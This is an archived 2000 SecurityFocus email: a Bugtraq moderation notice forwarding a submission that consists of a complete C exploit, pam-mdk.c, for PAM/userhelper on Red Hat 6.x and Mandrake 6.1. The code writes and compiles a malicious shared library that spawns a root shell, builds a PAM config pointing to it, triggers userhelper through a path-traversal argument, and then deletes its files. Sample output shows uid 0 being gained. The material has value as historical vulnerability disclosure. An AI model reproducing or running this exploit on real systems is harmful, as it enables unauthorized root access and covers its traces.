From aleph1@securityfocus.com Thu Mar 16 23:37:52 2000
Return-Path: <aleph1@securityfocus.com>
Delivered-To: jfr@securityfocus.com
Received: (qmail 4878 invoked by alias); 16 Mar 2000 23:37:50 -0000
Delivered-To: ops@securityfocus.com
Received: (qmail 4854 invoked by alias); 16 Mar 2000 23:37:47 -0000
Delivered-To: vuldb@securityfocus.com
Received: (qmail 4822 invoked by uid 101); 16 Mar 2000 23:37:43 -0000
Date: Thu, 16 Mar 2000 15:37:42 -0800
From: Elias Levy <aleph1@SECURITYFOCUS.COM>
To: vuldb@securityfocus.com
Subject: (forw) BUGTRAQ: approval required (354A1080)
Message-ID: <20000316153742.U12947@securityfocus.com>
Mime-Version: 1.0
Content-Type: multipart/mixed; boundary="+B+y8wtTXqdUj1xM"
X-Mailer: Mutt 1.0.1i
Status: RO
Content-Length: 4415
Lines: 122


--+B+y8wtTXqdUj1xM
Content-Type: text/plain; charset=us-ascii


-- 
Elias Levy
SecurityFocus.com
http://www.securityfocus.com/

--+B+y8wtTXqdUj1xM
Content-Type: message/rfc822

Return-Path: <>
Delivered-To: aleph1@SECURITYFOCUS.COM
Received: (qmail 6744 invoked from network); 15 Mar 2000 16:43:11 -0000
Received: from lists.securityfocus.com (207.126.127.68)
  by securityfocus.com with SMTP; 15 Mar 2000 16:43:11 -0000
Received: from lists.securityfocus.com (lists.securityfocus.com [207.126.127.68])
	by lists.securityfocus.com (Postfix) with ESMTP id C13CF23C48
	for <aleph1@SECURITYFOCUS.COM>; Tue, 14 Mar 2000 17:32:43 -0800 (PST)
Date:         Tue, 14 Mar 2000 17:32:43 -0800
From: "L-Soft list server at LISTS.SECURITYFOCUS.COM (1.8d)" <LISTSERV@LISTS.SECURITYFOCUS.COM>
Subject:      BUGTRAQ: approval required (354A1080)
To: Elias Levy <aleph1@SECURITYFOCUS.COM>
Message-Id: <20000315013243.C13CF23C48@lists.securityfocus.com>

This message was originally submitted by root@SECURITYFOCUS.COM to the BUGTRAQ
list at LISTS.SECURITYFOCUS.COM. You can  approve it using the "OK" mechanism,
ignore it, or repost an edited copy. The message will expire automatically and
you do not need to do anything if you just want to discard it. Please refer to
the list owner's guide if you are  not familiar with the "OK" mechanism; these
instructions  are  being  kept  purposefully short  for  your  convenience  in
processing large numbers of messages.

----------------- Original message (ID=354A1080) (85 lines) -------------------
Return-Path: <owner-bugtraq@securityfocus.com>
Delivered-To: bugtraq@lists.securityfocus.com
Received: from securityfocus.com (securityfocus.com [207.126.127.66])
	by lists.securityfocus.com (Postfix) with SMTP id 709A223D41
	for <bugtraq@lists.securityfocus.com>; Tue, 14 Mar 2000 16:25:49 -0800 (PST)
Received: (qmail 26903 invoked by alias); 15 Mar 2000 00:25:49 -0000
Delivered-To: BUGTRAQ@SECURITYFOCUS.COM
Received: (qmail 26887 invoked from network); 15 Mar 2000 00:25:47 -0000
Received: from itaipu.nitnet.com.br (200.255.111.241)
  by securityfocus.com with SMTP; 15 Mar 2000 00:25:47 -0000
Received: (qmail 30190 invoked from network); 15 Mar 2000 00:27:20 -0000
Received: from dial-111-67.nitnet.com.br (HELO nitnet.com.br) (root@200.255.111.67)
  by itaipu.nitnet.com.br with SMTP; 15 Mar 2000 00:27:20 -0000
Sender: root@securityfocus.com
/*
 * pam-mdk.c (C) 2000 Paulo Ribeiro
 *
 * DESCRIPTION:
 * -----------
 * Mandrake Linux 6.1 has the same problem as Red Hat Linux 6.x but its
 * exploit (pamslam.sh) doesn't work on it (at least on my machine). So,
 * I created this C program based on it which exploits PAM/userhelper
 * and gives you UID 0.
 *
 * SYSTEMS TESTED:
 * --------------
 * Red Hat Linux 6.0, Red Hat Linux 6.1, Mandrake Linux 6.1.
 *
 * RESULTS:
 * -------
 * [prrar@linux prrar]$ id
 * uid=501(prrar) gid=501(prrar) groups=501(prrar)
 * [prrar@linux prrar]$ gcc pam-mdk.c -o pam-mdk
 * [prrar@linux prrar]$ ./pam-mdk
 * sh-2.03# id
 * uid=0(root) gid=501(prrar) groups=501(prrar)
 * sh-2.03#
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(int argc, char *argv[])
{
        FILE *fp;

        strcpy(argv[0], "vi test.txt");

        fp = fopen("abc.c", "a");
        fprintf(fp, "#include<stdlib.h>\n");
        fprintf(fp, "#include<unistd.h>\n");
        fprintf(fp, "#include<sys/types.h>\n");
        fprintf(fp, "void _init(void) {\n");
        fprintf(fp, "\tsetuid(geteuid());\n");
        fprintf(fp, "\tsystem(\"/bin/sh\");\n");
        fprintf(fp, "}");
        fclose(fp);

        system("echo -e auth\trequired\t$PWD/abc.so > abc.conf");
        system("chmod 755 abc.conf");
        system("gcc -fPIC -o abc.o -c abc.c");
        system("ld -shared -o abc.so abc.o");
        system("chmod 755 abc.so");
        system("/usr/sbin/userhelper -w ../../..$PWD/abc.conf");
        system("rm -rf abc.*");
}

/* pam-mdk.c: EOF */
